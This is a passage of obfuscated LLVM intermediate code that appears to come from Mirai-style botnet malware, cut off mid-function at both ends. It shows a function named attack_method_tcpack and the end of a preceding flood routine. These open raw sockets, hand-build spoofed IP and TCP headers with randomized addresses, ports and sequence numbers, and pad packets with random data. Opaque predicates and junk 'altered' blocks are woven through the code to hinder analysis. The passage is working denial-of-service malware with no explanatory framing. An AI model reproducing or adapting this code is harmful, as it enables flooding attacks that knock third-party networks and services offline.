  %gen = mul i8 %_, 15
  %_15 = shl i8 %517, 15
  %_16 = sub i8 %517, 15
  %gen17 = mul i8 %_16, 15
  %518 = and i8 %517, 15
  %_18 = sub i8 0, %518
  %gen19 = add i8 %_18, 64
  %_20 = sub i8 0, %518
  %gen21 = add i8 %_20, 64
  %_22 = shl i8 %518, 64
  %_23 = sub i8 0, %518
  %gen24 = add i8 %_23, 64
  %_25 = sub i8 0, %518
  %gen26 = add i8 %_25, 64
  %_27 = sub i8 %518, 64
  %gen28 = mul i8 %_27, 64
  %_29 = shl i8 %518, 64
  %519 = or i8 %518, 64
  store i8 %519, i8* %516, align 4
  %520 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %521 = bitcast %struct.iphdr* %520 to i8*
  %522 = load i8, i8* %521, align 4
  %_30 = sub i8 %522, -16
  %gen31 = mul i8 %_30, -16
  %_32 = shl i8 %522, -16
  %523 = and i8 %522, -16
  %_33 = shl i8 %523, 5
  %_34 = sub i8 0, %523
  %gen35 = add i8 %_34, 5
  %_36 = sub i8 %523, 5
  %gen37 = mul i8 %_36, 5
  %524 = or i8 %523, 5
  store i8 %524, i8* %521, align 4
  %525 = load i8, i8* %12, align 1
  %526 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 1
  store i8 %525, i8* %527, align 1
  %528 = load i16, i16* %18, align 2
  %529 = zext i16 %528 to i64
  %_38 = sub i64 28, %529
  %gen39 = mul i64 %_38, %529
  %_40 = sub i64 28, %529
  %gen41 = mul i64 %_40, %529
  %_42 = sub i64 0, 28
  %gen43 = add i64 %_42, %529
  %_44 = shl i64 28, %529
  %_45 = shl i64 28, %529
  %_46 = sub i64 0, 28
  %gen47 = add i64 %_46, %529
  %530 = add i64 28, %529
  %531 = trunc i64 %530 to i16
  %532 = call zeroext i16 @htons(i16 zeroext %531) #7
  %533 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 2
  store i16 %532, i16* %534, align 2
  %535 = load i16, i16* %13, align 2
  %536 = call zeroext i16 @htons(i16 zeroext %535) #7
  %537 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 3
  store i16 %536, i16* %538, align 4
  %539 = load i8, i8* %14, align 1
  %540 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 5
  store i8 %539, i8* %541, align 4
  %542 = load i8, i8* %15, align 1
  %543 = icmp ne i8 %542, 0
  br label %originalBB14

originalBB51alteredBB:                            ; preds = %originalBB51, %214
  %544 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %545 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %546 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %545, i32 0, i32 4
  store i16 %544, i16* %546, align 2
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %268
  %547 = load i32, i32* %9, align 4
  %548 = load i8, i8* %5, align 1
  %549 = zext i8 %548 to i32
  %550 = icmp slt i32 %547, %549
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %341
  %551 = load i16, i16* %13, align 2
  %552 = zext i16 %551 to i32
  %553 = icmp eq i32 %552, 65535
  br label %originalBB59

originalBB63alteredBB:                            ; preds = %originalBB63, %366
  %554 = load i16, i16* %16, align 2
  %555 = zext i16 %554 to i32
  %556 = icmp eq i32 %555, 65535
  br label %originalBB63

originalBB67alteredBB:                            ; preds = %originalBB67, %395
  %557 = call i32 @rand_next()
  %558 = trunc i32 %557 to i16
  %559 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %560 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %559, i32 0, i32 1
  store i16 %558, i16* %560, align 2
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %416
  %561 = load i8, i8* %19, align 1
  %562 = icmp ne i8 %561, 0
  br label %originalBB71
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.31
  %6 = load i32, i32* @y.32
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca %struct.iphdr*, align 8
  %42 = alloca %struct.tcphdr*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %45 = load i8, i8* %13, align 1
  %46 = zext i8 %45 to i64
  %47 = call noalias i8* @calloc(i64 %46, i64 8) #6
  %48 = bitcast i8* %47 to i8**
  store i8** %48, i8*** %19, align 8
  %49 = load i8, i8* %15, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 2, i32 0)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %20, align 1
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 3, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %21, align 2
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 4, i32 64)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %22, align 1
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 5, i32 0)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %23, align 1
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 6, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %24, align 2
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 7, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %25, align 2
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 17, i32 65535)
  store i32 %75, i32* %26, align 4
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 18, i32 65535)
  store i32 %78, i32* %27, align 4
  %79 = load i8, i8* %15, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %28, align 1
  %83 = load i8, i8* %15, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %29, align 1
  %87 = load i8, i8* %15, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %30, align 1
  %91 = load i8, i8* %15, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %31, align 1
  %95 = load i8, i8* %15, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %32, align 1
  %99 = load i8, i8* %15, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 16, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %33, align 1
  %103 = load i8, i8* %15, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %105 = call i32 @attack_get_opt_int(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 0, i32 1458)
  store i32 %105, i32* %34, align 4
  %106 = load i8, i8* %15, align 1
  %107 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %108 = call i32 @attack_get_opt_int(i8 zeroext %106, %struct.attack_option* %107, i8 zeroext 1, i32 1)
  %109 = trunc i32 %108 to i8
  store i8 %109, i8* %35, align 1
  %110 = load i8, i8* %15, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %112 = load i32, i32* @LOCAL_ADDR, align 4
  %113 = call i32 @attack_get_opt_ip(i8 zeroext %110, %struct.attack_option* %111, i8 zeroext 25, i32 %112)
  store i32 %113, i32* %36, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %18, align 4
  %115 = icmp eq i32 %114, -1
  %116 = load i32, i32* @x.31
  %117 = load i32, i32* @y.32
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %115, label %124, label %125

; <label>:124:                                    ; preds = %originalBBpart2
  br label %648

; <label>:125:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %126 = load i32, i32* %18, align 4
  %127 = bitcast i32* %17 to i8*
  %128 = call i32 @setsockopt(i32 %126, i32 0, i32 3, i8* %127, i32 4) #6
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %130, label %133

; <label>:130:                                    ; preds = %125
  %131 = load i32, i32* %18, align 4
  %132 = call i32 @close(i32 %131)
  br label %648

; <label>:133:                                    ; preds = %125
  store i32 0, i32* %17, align 4
  br label %134

; <label>:134:                                    ; preds = %325, %133
  %135 = load i32, i32* %17, align 4
  %136 = load i8, i8* %13, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp slt i32 %135, %137
  br i1 %138, label %139, label %328

; <label>:139:                                    ; preds = %134
  store i8* getelementptr inbounds ([513 x i8], [513 x i8]* @.str.256, i32 0, i32 0), i8** %39, align 8
  %140 = call noalias i8* @calloc(i64 1458, i64 1) #6
  %141 = load i8**, i8*** %19, align 8
  %142 = load i32, i32* %17, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds i8*, i8** %141, i64 %143
  store i8* %140, i8** %144, align 8
  %145 = load i8**, i8*** %19, align 8
  %146 = load i32, i32* %17, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8*, i8** %145, i64 %147
  %149 = load i8*, i8** %148, align 8
  %150 = bitcast i8* %149 to %struct.iphdr*
  store %struct.iphdr* %150, %struct.iphdr** %37, align 8
  %151 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %152 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %151, i64 1
  %153 = bitcast %struct.iphdr* %152 to %struct.tcphdr*
  store %struct.tcphdr* %153, %struct.tcphdr** %38, align 8
  %154 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %155 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %154, i64 512
  %156 = bitcast %struct.tcphdr* %155 to i8*
  store i8* %156, i8** %39, align 8
  %157 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %158 = bitcast %struct.iphdr* %157 to i8*
  %159 = load i8, i8* %158, align 4
  %160 = and i8 %159, 15
  %161 = or i8 %160, 64
  store i8 %161, i8* %158, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %163 = bitcast %struct.iphdr* %162 to i8*
  %164 = load i8, i8* %163, align 4
  %165 = and i8 %164, -16
  %166 = or i8 %165, 5
  store i8 %166, i8* %163, align 4
  %167 = load i8, i8* %20, align 1
  %168 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 1
  store i8 %167, i8* %169, align 1
  %170 = load i32, i32* %34, align 4
  %171 = sext i32 %170 to i64
  %172 = add i64 40, %171
  %173 = trunc i64 %172 to i16
  %174 = call zeroext i16 @htons(i16 zeroext %173) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 2
  store i16 %174, i16* %176, align 2
  %177 = load i16, i16* %21, align 2
  %178 = call zeroext i16 @htons(i16 zeroext %177) #7
  %179 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 3
  store i16 %178, i16* %180, align 4
  %181 = load i8, i8* %22, align 1
  %182 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 5
  store i8 %181, i8* %183, align 4
  %184 = load i8, i8* %23, align 1
  %185 = icmp ne i8 %184, 0
  br i1 %185, label %186, label %206

; <label>:186:                                    ; preds = %139
  %187 = load i32, i32* @x.31
  %188 = load i32, i32* @y.32
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %186
  %195 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 4
  store i16 %195, i16* %197, align 2
  %198 = load i32, i32* @x.31
  %199 = load i32, i32* @y.32
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %206

; <label>:206:                                    ; preds = %originalBBpart24, %139
  %207 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %208 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %207, i32 0, i32 6
  store i8 6, i8* %208, align 1
  %209 = load i32, i32* %36, align 4
  %210 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %211 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %210, i32 0, i32 8
  store i32 %209, i32* %211, align 4
  %212 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %213 = load i32, i32* %17, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i64 %214
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %215, i32 0, i32 1
  %217 = load i32, i32* %216, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  %220 = load i16, i16* %24, align 2
  %221 = call zeroext i16 @htons(i16 zeroext %220) #7
  %222 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %223 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %222, i32 0, i32 0
  store i16 %221, i16* %223, align 4
  %224 = load i16, i16* %25, align 2
  %225 = call zeroext i16 @htons(i16 zeroext %224) #7
  %226 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %227 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %226, i32 0, i32 1
  store i16 %225, i16* %227, align 2
  %228 = load i32, i32* %26, align 4
  %229 = trunc i32 %228 to i16
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = zext i16 %230 to i32
  %232 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 2
  store i32 %231, i32* %233, align 4
  %234 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %236, -241
  %238 = or i16 %237, 80
  store i16 %238, i16* %235, align 4
  %239 = load i8, i8* %28, align 1
  %240 = sext i8 %239 to i16
  %241 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %242 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = and i16 %240, 1
  %245 = shl i16 %244, 13
  %246 = and i16 %243, -8193
  %247 = or i16 %246, %245
  store i16 %247, i16* %242, align 4
  %248 = load i8, i8* %29, align 1
  %249 = sext i8 %248 to i16
  %250 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 4
  %252 = load i16, i16* %251, align 4
  %253 = and i16 %249, 1
  %254 = shl i16 %253, 12
  %255 = and i16 %252, -4097
  %256 = or i16 %255, %254
  store i16 %256, i16* %251, align 4
  %257 = load i8, i8* %30, align 1
  %258 = sext i8 %257 to i16
  %259 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %260 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %259, i32 0, i32 4
  %261 = load i16, i16* %260, align 4
  %262 = and i16 %258, 1
  %263 = shl i16 %262, 11
  %264 = and i16 %261, -2049
  %265 = or i16 %264, %263
  store i16 %265, i16* %260, align 4
  %266 = load i8, i8* %31, align 1
  %267 = sext i8 %266 to i16
  %268 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 4
  %270 = load i16, i16* %269, align 4
  %271 = and i16 %267, 1
  %272 = shl i16 %271, 10
  %273 = and i16 %270, -1025
  %274 = or i16 %273, %272
  store i16 %274, i16* %269, align 4
  %275 = load i8, i8* %32, align 1
  %276 = sext i8 %275 to i16
  %277 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %278 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %277, i32 0, i32 4
  %279 = load i16, i16* %278, align 4
  %280 = and i16 %276, 1
  %281 = shl i16 %280, 9
  %282 = and i16 %279, -513
  %283 = or i16 %282, %281
  store i16 %283, i16* %278, align 4
  %284 = load i8, i8* %33, align 1
  %285 = sext i8 %284 to i16
  %286 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %287 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %286, i32 0, i32 4
  %288 = load i16, i16* %287, align 4
  %289 = and i16 %285, 1
  %290 = shl i16 %289, 8
  %291 = and i16 %288, -257
  %292 = or i16 %291, %290
  store i16 %292, i16* %287, align 4
  %293 = call i32 @rand() #6
  %294 = srem i32 %293, 65535
  %295 = trunc i32 %294 to i16
  %296 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 5
  store i16 %295, i16* %297, align 2
  %298 = load i8, i8* %30, align 1
  %299 = icmp ne i8 %298, 0
  br i1 %299, label %300, label %322

; <label>:300:                                    ; preds = %206
  %301 = load i32, i32* @x.31
  %302 = load i32, i32* @y.32
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %300
  %309 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %310 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %309, i32 0, i32 4
  %311 = load i16, i16* %310, align 4
  %312 = and i16 %311, -2049
  %313 = or i16 %312, 2048
  store i16 %313, i16* %310, align 4
  %314 = load i32, i32* @x.31
  %315 = load i32, i32* @y.32
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBBpart220, label %originalBB6alteredBB

originalBBpart220:                                ; preds = %originalBB6
  br label %322

; <label>:322:                                    ; preds = %originalBBpart220, %206
  %323 = load i8*, i8** %39, align 8
  %324 = load i32, i32* %34, align 4
  call void @rand_str(i8* %323, i32 %324)
  br label %325

; <label>:325:                                    ; preds = %322
  %326 = load i32, i32* %17, align 4
  %327 = add nsw i32 %326, 1
  store i32 %327, i32* %17, align 4
  br label %134

; <label>:328:                                    ; preds = %134
  %329 = load i32, i32* @x.31
  %330 = load i32, i32* @y.32
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %328
  %337 = load i32, i32* @x.31
  %338 = load i32, i32* @y.32
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %345

; <label>:345:                                    ; preds = %originalBBpart278, %originalBBpart224
  %346 = load i32, i32* @x.31
  %347 = load i32, i32* @y.32
  %348 = sub i32 %346, 1
  %349 = mul i32 %346, %348
  %350 = urem i32 %349, 2
  %351 = icmp eq i32 %350, 0
  %352 = icmp slt i32 %347, 10
  %353 = or i1 %351, %352
  br i1 %353, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %345
  store i32 0, i32* %17, align 4
  %354 = load i32, i32* @x.31
  %355 = load i32, i32* @y.32
  %356 = sub i32 %354, 1
  %357 = mul i32 %354, %356
  %358 = urem i32 %357, 2
  %359 = icmp eq i32 %358, 0
  %360 = icmp slt i32 %355, 10
  %361 = or i1 %359, %360
  br i1 %361, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %362

; <label>:362:                                    ; preds = %originalBBpart274, %originalBBpart228
  %363 = load i32, i32* %17, align 4
  %364 = load i8, i8* %13, align 1
  %365 = zext i8 %364 to i32
  %366 = icmp slt i32 %363, %365
  br i1 %366, label %367, label %631

; <label>:367:                                    ; preds = %362
  %368 = load i8**, i8*** %19, align 8
  %369 = load i32, i32* %17, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds i8*, i8** %368, i64 %370
  %372 = load i8*, i8** %371, align 8
  store i8* %372, i8** %40, align 8
  %373 = load i8*, i8** %40, align 8
  %374 = bitcast i8* %373 to %struct.iphdr*
  store %struct.iphdr* %374, %struct.iphdr** %41, align 8
  %375 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %376 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %375, i64 1
  %377 = bitcast %struct.iphdr* %376 to %struct.tcphdr*
  store %struct.tcphdr* %377, %struct.tcphdr** %42, align 8
  %378 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %379 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %378, i64 1
  %380 = bitcast %struct.tcphdr* %379 to i8*
  store i8* %380, i8** %43, align 8
  %381 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %382 = load i32, i32* %17, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %384, i32 0, i32 2
  %386 = load i8, i8* %385, align 4
  %387 = zext i8 %386 to i32
  %388 = icmp slt i32 %387, 32
  br i1 %388, label %389, label %410

; <label>:389:                                    ; preds = %367
  %390 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %391 = load i32, i32* %17, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 1
  %395 = load i32, i32* %394, align 4
  %396 = call i32 @ntohl(i32 %395) #7
  %397 = call i32 @rand_next()
  %398 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %399 = load i32, i32* %17, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 2
  %403 = load i8, i8* %402, align 4
  %404 = zext i8 %403 to i32
  %405 = lshr i32 %397, %404
  %406 = add i32 %396, %405
  %407 = call i32 @htonl(i32 %406) #7
  %408 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 9
  store i32 %407, i32* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %389, %367
  %411 = load i32, i32* @x.31
  %412 = load i32, i32* @y.32
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %410
  %419 = load i32, i32* %36, align 4
  %420 = icmp eq i32 %419, -1
  %421 = load i32, i32* @x.31
  %422 = load i32, i32* @y.32
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %420, label %429, label %433

; <label>:429:                                    ; preds = %originalBBpart232
  %430 = call i32 @rand_next()
  %431 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 8
  store i32 %430, i32* %432, align 4
  br label %433

; <label>:433:                                    ; preds = %429, %originalBBpart232
  %434 = load i16, i16* %21, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %443

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = and i32 %438, 65535
  %440 = trunc i32 %439 to i16
  %441 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %442 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %441, i32 0, i32 3
  store i16 %440, i16* %442, align 4
  br label %443

; <label>:443:                                    ; preds = %437, %433
  %444 = load i16, i16* %24, align 2
  %445 = zext i16 %444 to i32
  %446 = icmp eq i32 %445, 65535
  br i1 %446, label %447, label %453

; <label>:447:                                    ; preds = %443
  %448 = call i32 @rand_next()
  %449 = and i32 %448, 65535
  %450 = trunc i32 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  store i16 %450, i16* %452, align 4
  br label %453

; <label>:453:                                    ; preds = %447, %443
  %454 = load i16, i16* %25, align 2
